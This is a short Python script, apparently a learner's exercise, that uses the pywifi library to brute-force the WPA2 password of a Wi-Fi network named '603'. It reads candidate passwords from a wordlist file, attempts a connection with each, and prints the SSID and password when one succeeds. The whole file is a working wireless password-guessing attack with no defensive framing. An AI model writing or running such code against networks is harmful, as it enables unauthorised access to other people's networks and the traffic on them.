from gevent import monkey

monkey.patch_all()

import gevent
import time
import pywifi
from pywifi import const


class TestWifi:
	"""连接wifi"""

	def __init__(self, path, wifi_name):
		self.wifi = pywifi.PyWiFi()
		self.profile = pywifi.Profile()  # 配置文件
		self.isok = False  # 标识连接成功状态,初值为连接失败
		self.path = path
		self.profile.ssid = wifi_name  # 就是wifi名称

	def connect(self, word):
		self.wifi.interfaces()[0].disconnect()
		time.sleep(3)  # 断开以后缓冲3秒

		self.profile.auth = const.AUTH_ALG_OPEN  # 需要密码链接
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
		self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
		self.profile.key = word  # 测试密码成功或者失败
		self.wifi.interfaces()[0].remove_all_network_profiles()  # 删除其他所有配置文件
		tmp_profile = self.wifi.interfaces()[0].add_network_profile(self.profile)  # 加载配置文件
		self.wifi.interfaces()[0].connect(tmp_profile)  # 连接
		time.sleep(5)  # 5秒内看是否可以链接上。

	def connect_success(self):
		if self.wifi.interfaces()[0].status() == const.IFACE_CONNECTED:  # 连接成功
			self.isok = True
			print("%s 连接成功,密码是:%s" % (self.profile.ssid, self.profile.key))
		else:
			print("%s 连接失败,密码是:%s" % (self.profile.ssid, self.profile.key))

		self.wifi.interfaces()[0].disconnect()  # 断开连接
		time.sleep(1)
		return self.isok


def main():
	wifi = TestWifi(r"E:\Python练习代码\PythonFile\分类练习\code_破解WiFi\pass1.txt", '603')
	with open(wifi.path, 'r') as file:
		while True:
			res = file.readline().strip()
			wifi.connect(res)
			wifi.connect_success()


if __name__ == '__main__':
	main()
